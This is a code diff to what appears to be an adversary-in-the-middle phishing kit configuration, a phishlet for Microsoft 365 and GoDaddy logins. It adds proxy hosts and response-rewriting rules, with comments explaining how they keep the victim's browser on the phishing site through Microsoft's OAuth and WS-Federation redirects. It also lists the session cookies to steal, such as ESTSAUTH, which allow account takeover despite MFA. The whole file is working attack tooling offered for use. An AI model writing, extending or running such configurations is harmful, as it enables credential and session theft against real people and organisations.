@@ -28,10 +28,31 @@ proxy_hosts:
   # (deploy/experiments/passwordless.md). First match still wins for rewriting,
   # so the existing login.* flow is unchanged.
   - { phish_sub: "msauth", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: false }
+  # office.com routes the login to m365.cloud.microsoft; undeclared, its 301 is
+  # left alone and the browser leaves the phish mid-flow (see deploy/experiments/passwordless.md).
+  - { phish_sub: "m365", orig_sub: "m365", domain: "cloud.microsoft", session: true, is_landing: false, auto_filter: true }
+  # A warm "/" hands off to WS-Federation via a form_post to
+  # https://portal.microsoftonline.com?wa=wsignin1.0. Undeclared, that POST goes to
+  # the real portal and the browser leaves the phish (seen with prompt=select_account).
+  - { phish_sub: "portal", orig_sub: "portal", domain: "microsoftonline.com", session: true, is_landing: false, auto_filter: true }
+  # The WS-Federation portal then bounces to www.microsoft365.com (office.com's
+  # new name). Distinct phish_sub on purpose: duplicate phish hosts are ambiguous.
+  - { phish_sub: "microsoft365", orig_sub: "www", domain: "microsoft365.com", session: true, is_landing: false, auto_filter: true }
 
 sub_filters:
   - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
   - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"], redirect_only: true }
+  # The OAuth form_post page carries the redirect_uri in its <form action>
+  # ("https://www.office.com/landingv2"). office.com registers that exact host,
+  # so the URL cannot be changed for Microsoft - it has to be rewritten in the
+  # body, or the browser posts to the real office.com the moment login succeeds.
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  # ...and for the m365 client the very same page names m365.cloud.microsoft.
+  # The m365-host filters below only run on m365 *responses*, never on this one.
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "m365", domain: "cloud.microsoft", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  # ...and the WS-Federation hand-off form names portal.microsoftonline.com.
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "portal", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "www", domain: "microsoft365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
   - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
   - { triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'href="https://{hostname}/149e9513-01fa-4fb0-aad4-566afd725d1b/2d206a39-8ed7-437e-a3be-862e0f06eea3/fp', replace: 'href="https://{hostname}/149e9513-01fa-4fb0-aad4-566afd725d1b/2d206a39-8ed7-437e-a3be-862e0f06eea3/fp', mimes: ['text/html', 'application/json', 'application/javascript'] }
   - { triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
@@ -51,9 +72,9 @@ sub_filters:
 
 auth_tokens:
   - domain: '.login.microsoftonline.com'
-    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'esctx', 'brcap']
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'esctx,opt', 'brcap,opt']
   - domain: 'login.microsoftonline.com'
-    keys: ['ESTSSC', 'ESTSAUTHLIGHT', 'buid', 'fpc', 'stsservicecookie', 'x-ms-gateway-slice']
+    keys: ['ESTSSC,opt', 'ESTSAUTHLIGHT', 'buid', 'fpc', 'stsservicecookie,opt', 'x-ms-gateway-slice']
   - domain: '.live.com'
     keys: ['.*,regexp']
   - domain: '.login.live.com'
